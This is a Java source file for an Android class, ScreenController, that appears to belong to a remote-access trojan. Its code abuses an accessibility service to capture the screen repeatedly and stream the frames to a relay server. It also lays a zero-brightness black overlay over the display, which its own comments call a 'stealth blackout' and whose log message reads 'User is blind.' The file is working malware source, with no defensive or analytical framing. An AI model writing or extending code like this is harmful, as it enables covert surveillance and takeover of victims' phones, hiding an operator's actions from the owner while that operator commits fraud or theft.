/*
 * MODULE: ScreenController.java
 * PURPOSE: Complete display manager integrating real-time MJPEG hardware screen capture streaming and zero-brightness stealth black overlay.
 *
 * DIRECT INBOUND CONNECTIONS:
 * - ControlService.java -> start(), stop(), setQuality(int), showBlackScreen(String), hideBlackScreen(), cleanup()
 *
 * DIRECT OUTBOUND CONNECTIONS:
 * - RelayClient.java -> send(JSONObject "screen_frame"), sendLog(String)
 * - WindowManager -> TYPE_ACCESSIBILITY_OVERLAY zero-brightness blackout
 * - AccessibilityService -> takeScreenshot(Display.DEFAULT_DISPLAY, ...)
 *
 * FUNCTION-BY-FUNCTION FLOW MAPPING:
 * - ScreenController(AccessibilityService, String): Captures service and ID; binds WindowManager.
 * - setQuality(int): Adjusts JPEG compression quality dynamically.
 * - start(): Starts high-efficiency screenshot loop on single-threaded executor.
 * - stop(): Shuts down streaming loop and cleans up cached bitmaps.
 * - captureLoop(): Paces screenshot requests with frame-in-flight throttling.
 * - processHardwareScreenshot(ScreenshotResult): Converts HardwareBuffer into RGB_565 bitmap, compresses to JPEG, and sends base64 frame.
 * - showBlackScreen(String): Attaches zero-brightness overlay window via WindowManager.
 * - hideBlackScreen(): Removes dark overlay from WindowManager.
 * - cleanup(): Tears down screen stream and detaches overlay.
 */
package com.device.ctrl;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Matrix;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import android.view.Display;
import android.view.Gravity;
import android.view.WindowManager;
import android.widget.FrameLayout;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class ScreenController {

    private final AccessibilityService srv;
    private final String androidId;
    private final Handler h = new Handler(Looper.getMainLooper());
    private boolean isStreaming = false;
    private int quality = 45;
    private Bitmap reusableBitmap = null;
    private Canvas reusableCanvas = null;
    private volatile boolean isFrameInFlight = false;
    private long frameInFlightTime = 0;
    private ExecutorService captureExecutor = null;
    private final ByteArrayOutputStream reusableBaos = new ByteArrayOutputStream(64 * 1024);

    // Stealth blackout overlay
    private FrameLayout darkView;
    private WindowManager wm;

    public ScreenController(AccessibilityService srv, String androidId) {
        this.srv = srv;
        this.androidId = androidId;
        this.wm = (WindowManager) srv.getSystemService(Context.WINDOW_SERVICE);
    }

    // ─── MJPEG SCREEN STREAMING ────────────────────────────────────────────────

    public void setQuality(int q) {
        if (q > 0 && q <= 100) this.quality = q;
    }

    public synchronized void start() {
        if (isStreaming) return;
        isStreaming = true;
        isFrameInFlight = false;
        if (captureExecutor == null || captureExecutor.isShutdown()) {
            captureExecutor = Executors.newSingleThreadExecutor();
        }
        RelayClient.get().sendLog("📺 Screen Stream Started");
        captureLoop();
    }

    public synchronized void stop() {
        if (!isStreaming) return;
        isStreaming = false;
        isFrameInFlight = false;
        h.removeCallbacksAndMessages(null);
        if (captureExecutor != null && !captureExecutor.isShutdown()) {
            captureExecutor.shutdownNow();
            captureExecutor = null;
        }
        if (reusableBitmap != null && !reusableBitmap.isRecycled()) {
            reusableBitmap.recycle();
            reusableBitmap = null;
            reusableCanvas = null;
        }
        reusableBaos.reset();
        RelayClient.get().sendLog("📺 Screen Stream Stopped");
    }

    private void captureLoop() {
        if (!isStreaming) return;

        if (isFrameInFlight) {
            if (System.currentTimeMillis() - frameInFlightTime > 1500) {
                isFrameInFlight = false;
            } else {
                h.postDelayed(this::captureLoop, 30);
                return;
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                isFrameInFlight = true;
                frameInFlightTime = System.currentTimeMillis();
                srv.takeScreenshot(Display.DEFAULT_DISPLAY, srv.getMainExecutor(), new AccessibilityService.TakeScreenshotCallback() {
                    @Override
                    public void onSuccess(AccessibilityService.ScreenshotResult screenshotResult) {
                        if (!isStreaming) {
                            isFrameInFlight = false;
                            return;
                        }
                        if (captureExecutor != null && !captureExecutor.isShutdown()) {
                            captureExecutor.execute(() -> {
                                try {
                                    processHardwareScreenshot(screenshotResult);
                                } finally {
                                    isFrameInFlight = false;
                                }
                            });
                        } else {
                            isFrameInFlight = false;
                        }
                        h.postDelayed(ScreenController.this::captureLoop, 160);
                    }

                    @Override
                    public void onFailure(int errorCode) {
                        isFrameInFlight = false;
                        if (errorCode != 3) {
                            RelayClient.get().sendLog("❌ Screenshot API failure: " + errorCode);
                        }
                        // Code 3 is ERROR_TAKE_SCREENSHOT_INTERVAL_TIME_SHORT. Back off smoothly.
                        h.postDelayed(ScreenController.this::captureLoop, errorCode == 3 ? 220 : 250);
                    }
                });
            } catch (Exception e) {
                isFrameInFlight = false;
                RelayClient.get().sendLog("❌ Screenshot exec error: " + e.getMessage());
                h.postDelayed(this::captureLoop, 250);
            }
        }
    }

    private void processHardwareScreenshot(AccessibilityService.ScreenshotResult screenshotResult) {
        android.hardware.HardwareBuffer hardwareBuffer = null;
        Bitmap hardwareBitmap = null;
        Bitmap softwareBitmap = null;
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                hardwareBuffer = screenshotResult.getHardwareBuffer();
                if (hardwareBuffer == null) return;

                hardwareBitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, screenshotResult.getColorSpace());
                if (hardwareBitmap == null) return;

                // Software Canvas cannot draw Hardware bitmaps directly without throwing IllegalArgumentException.
                softwareBitmap = hardwareBitmap.copy(Bitmap.Config.ARGB_8888, false);
                hardwareBitmap.recycle();
                hardwareBitmap = null;
                if (softwareBitmap == null) return;

                int targetW = softwareBitmap.getWidth() / 2;
                int targetH = softwareBitmap.getHeight() / 2;

                if (reusableBitmap == null || reusableBitmap.getWidth() != targetW || reusableBitmap.getHeight() != targetH || reusableBitmap.isRecycled()) {
                    if (reusableBitmap != null && !reusableBitmap.isRecycled()) {
                        reusableBitmap.recycle();
                    }
                    reusableBitmap = Bitmap.createBitmap(targetW, targetH, Bitmap.Config.RGB_565);
                    reusableCanvas = new Canvas(reusableBitmap);
                }

                Matrix matrix = new Matrix();
                matrix.setScale((float) targetW / softwareBitmap.getWidth(), (float) targetH / softwareBitmap.getHeight());
                reusableCanvas.drawBitmap(softwareBitmap, matrix, null);
                softwareBitmap.recycle();
                softwareBitmap = null;

                reusableBaos.reset();
                reusableBitmap.compress(Bitmap.CompressFormat.JPEG, quality, reusableBaos);
                byte[] jpegBytes = reusableBaos.toByteArray();

                String b64 = Base64.encodeToString(jpegBytes, Base64.NO_WRAP);
                RelayClient.get().send(new JSONObject()
                        .put("type", "screen_frame")
                        .put("androidId", androidId)
                        .put("image", b64));
            }
        } catch (Exception e) {
            RelayClient.get().sendLog("❌ Screenshot proc error: " + e.getMessage());
        } finally {
            if (softwareBitmap != null && !softwareBitmap.isRecycled()) {
                softwareBitmap.recycle();
            }
            if (hardwareBitmap != null && !hardwareBitmap.isRecycled()) {
                hardwareBitmap.recycle();
            }
            if (hardwareBuffer != null) {
                hardwareBuffer.close();
            }
        }
    }

    // ─── BLACKOUT OVERLAY ──────────────────────────────────────────────────────

    public void showBlackScreen(String dummyText) {
        if (darkView != null) return;
        if (wm == null) wm = (WindowManager) srv.getSystemService(Context.WINDOW_SERVICE);
        darkView = new FrameLayout(srv);
        darkView.setBackgroundColor(Color.BLACK);

        int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1
                ? WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
                : WindowManager.LayoutParams.TYPE_PHONE;

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                PixelFormat.TRANSLUCENT
        );
        params.gravity = Gravity.TOP | Gravity.START;
        params.screenBrightness = 0.0f;
        try {
            wm.addView(darkView, params);
            RelayClient.get().sendLog("👁️ Zero-Brightness Black Screen Active. User is blind.");
        } catch (Exception e) {
            RelayClient.get().sendLog("❌ Black Screen failed: " + e.getMessage());
        }
    }

    public void hideBlackScreen() {
        if (darkView != null && wm != null) {
            try {
                wm.removeView(darkView);
                darkView = null;
                RelayClient.get().sendLog("👁️ Black Screen removed.");
            } catch (Exception ignored) {}
        }
    }

    public void cleanup() {
        stop();
        hideBlackScreen();
    }
}
